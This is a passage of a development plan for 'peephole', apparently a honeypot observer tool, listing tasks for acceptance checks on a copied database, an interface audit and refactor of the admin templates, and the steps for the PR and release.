### Task 15: Acceptance on real data

**Files:** none in the repo. Write the report to the session's scratchpad.

- [ ] **Step 1: Copy the observer database and run the new build on the copy**

Use `sqlite3 -readonly <db> ".backup '<scratchpad>/observer.db'"`, a temporary config with no trap, scanner or cluster, then `peephole store recompute-campaigns`. Never run the new build on the live observer data. No payload URL is contacted.

- [ ] **Step 2: Check all 9 acceptance items in the spec, plus the profile for `pr3d4t0r.php`**

Record the actual numbers next to the spec's. Any failure goes back to the owning task, with a test, before the release.

- [ ] **Step 3: Check the pages in a browser, in light and dark, and on a narrow window**

Use the `run` skill. Check request, upload, address, campaign, piece and Chains pages.

- [ ] **Step 4: Update `docs/roadmap.md`**

---

## Phase 2: Streamline the interface

Same branch and same PR, after Task 15. The rules in the spec's "Phase 2" section apply: no function removed without the user agreeing, URLs stay stable through `admin::moved`, no new dependencies, tokens and brand stay, light and dark both checked, narrow screens and keyboard keep working.

### Task 16: Audit

**Files:**
- Create: `docs/superpowers/specs/2026-11-XX-interface-audit.md`, with the date it is written

- [ ] **Step 1: Walk every template against the checklist**

Checklist: page header, back navigation, admin nav present or not, facts layout, empty state, table density, section order, repeated markup.

- [ ] **Step 2: Propose the changes and any removal**

Group the findings by Tasks 17–19. List every proposed removal or move of a function separately.

- [ ] **Step 3: Ask the user to approve the list before Tasks 17–19**

### Task 17: One detail-page frame

**Files:**
- Create: `templates/_detail_head.html`
- Modify: request, address, upload, link, campaign, asn and scan page templates and their handlers

- [ ] **Step 1: Write failing tests**

`every_detail_page_has_the_shared_header`, `admin_nav_rule_is_the_same_on_every_detail_page`, `public_ip_page_has_no_admin_nav`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib admin::`. Expected: FAIL.

- [ ] **Step 3: Implement the shared header, then the one back-navigation rule from the audit**

- [ ] **Step 4: Run the full suite and check the pages in a browser**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "admin: one frame for detail pages"`

### Task 18: Lead with evidence

**Files:**
- Modify: `templates/request.html`, `templates/campaign.html`, `templates/_target.html`, `assets/css/35-pages.css`

- [ ] **Step 1: Write failing tests**

`request_page_order_is_strip_xray_facts`, `headers_are_collapsed`, `campaign_order_is_flow_chains_members_evidence`, `fragment_links_still_land` (`#drops`, `#canaries`, `#scans`).

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib admin::pages admin::campaigns`. Expected: FAIL.

- [ ] **Step 3: Reorder as the audit agreed**

- [ ] **Step 4: Run the full suite and check the pages in a browser**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "admin: detail pages open with the evidence"`

### Task 19: Partials and navigation

**Files:** from the audit's agreed list.

- [ ] **Step 1: Replace near-duplicates with shared partials**

Each replacement keeps its page's existing tests green, and splits long one-line templates it touches.

- [ ] **Step 2: Apply the agreed navigation changes**

Add every moved URL to `admin::moved`, with a test that the old URL redirects. Update `ADMIN_TREE`.

- [ ] **Step 3: Run the full suite and check every section in a browser**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 4: Commit**

`git commit -m "admin: shared partials and navigation clean-up"`

## Delivery

### Task 20: One PR, one release

**Files:**
- Modify: `Cargo.toml`, `Cargo.lock`, `CHANGELOG.md`

- [ ] **Step 1: Repeat the acceptance checks of Task 15 on the final branch**

Expected: all 9 items hold after Phase 2.

- [ ] **Step 2: Run a whole-branch review and fix every finding, minors included**

- [ ] **Step 3: Rebase on `origin/master`, push, and open the one PR**

The PR body ends with the attribution line given for pull requests.

- [ ] **Step 4: Wait for checks, then merge**

Run: `gh pr checks <n> --watch`, then `gh pr merge <n> --merge`. Never use `--auto`: master has no branch protection, so it merges at once.

- [ ] **Step 5: Cut the release**

Follow the release process: bump `version` in `Cargo.toml` and `Cargo.lock`, turn `## [Unreleased]` into `## [X.Y.Z] - date` with a compare link, commit `Release X.Y.Z` on master, tag `vX.Y.Z` annotated `peephole vX.Y.Z`, push master, then the tag. No manual builds.

- [ ] **Step 6: Watch the CI run until it publishes, and report the result**
